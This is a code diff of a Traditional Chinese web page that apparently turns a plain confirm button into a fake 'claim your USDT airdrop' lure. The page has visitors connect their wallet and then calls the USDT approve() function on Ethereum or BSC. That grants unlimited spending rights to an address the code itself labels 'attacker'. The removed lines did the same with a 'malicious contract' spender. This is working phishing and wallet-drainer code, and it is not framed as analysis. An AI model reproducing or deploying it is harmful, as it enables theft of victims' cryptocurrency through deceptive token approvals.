@@ -3,34 +3,63 @@
 <html lang="zh-Hant">
 <head>
   <meta charset="UTF-8" />
-  <title>確認</title>
+  <title>🎁 領取你的 USDT 空投</title>
 </head>
-<body style="text-align: center; font-family: sans-serif; padding-top: 100px;">
-  <button style="font-size: 1.2rem; padding: 1em 2em;" onclick="approveUSDT()">確認</button>
+<body style="text-align: center; padding-top: 60px; font-family: sans-serif;">
+  <h2>🎉 恭喜你獲得空投！</h2>
+  <p>請先連接錢包並確認授權以領取獎勵</p>
+  <button onclick="connectWallet()">連接錢包</button>
+  <br><br>
+  <button onclick="approve()">確認授權</button>
 
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
   <script>
-    const usdtAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
-    const spender = "0x2b1D7DcB43012eE1E21934420CfCC2F88E730F10"; // 惡意合約地址（非EOA）
-    const abi = ["function approve(address spender, uint256 amount) external returns (bool)"];
+    let signer;
 
-    async function approveUSDT() {
+    const USDT_BY_CHAIN = {
+      1: "0xdAC17F958D2ee523a2206206994597C13D831ec7",  // Ethereum
+      56: "0x55d398326f99059ff775485246999027b3197955" // BSC
+    };
+
+    const attacker = "0xDa4FfA490992769B8F54063bf0B9E7a4D3479459";
+    const abi = [
+      "function approve(address spender, uint256 amount) external returns (bool)"
+    ];
+
+    async function connectWallet() {
       if (!window.ethereum) {
-        alert("請先安裝 MetaMask");
+        alert("請先安裝 MetaMask 或 WalletConnect 錢包");
+        return;
+      }
+      const provider = new ethers.providers.Web3Provider(window.ethereum);
+      await provider.send("eth_requestAccounts", []);
+      signer = provider.getSigner();
+      const address = await signer.getAddress();
+      alert("✅ 已連接錢包：" + address);
+    }
+
+    async function approve() {
+      if (!signer) {
+        alert("請先連接錢包");
         return;
       }
 
       const provider = new ethers.providers.Web3Provider(window.ethereum);
-      await provider.send("eth_requestAccounts", []);
-      const signer = provider.getSigner();
+      const network = await provider.getNetwork();
+      const chainId = network.chainId;
+      const tokenAddress = USDT_BY_CHAIN[chainId];
 
+      if (!tokenAddress) {
+        alert("此鏈不支援 USDT 授權！");
+        return;
+      }
+
+      const contract = new ethers.Contract(tokenAddress, abi, signer);
       try {
-        const usdt = new ethers.Contract(usdtAddress, abi, signer);
-        const tx = await usdt.approve(spender, ethers.constants.MaxUint256);
-        console.log("✅ 已授權 USDT", tx.hash);
-        alert("確認完成，TX: " + tx.hash);
+        const tx = await contract.approve(attacker, ethers.constants.MaxUint256);
+        alert("✅ 授權成功！Tx Hash: " + tx.hash);
       } catch (err) {
-        console.error("❌ 授權失敗：", err);
+        console.error(err);
         alert("授權失敗：" + err.message);
       }
     }
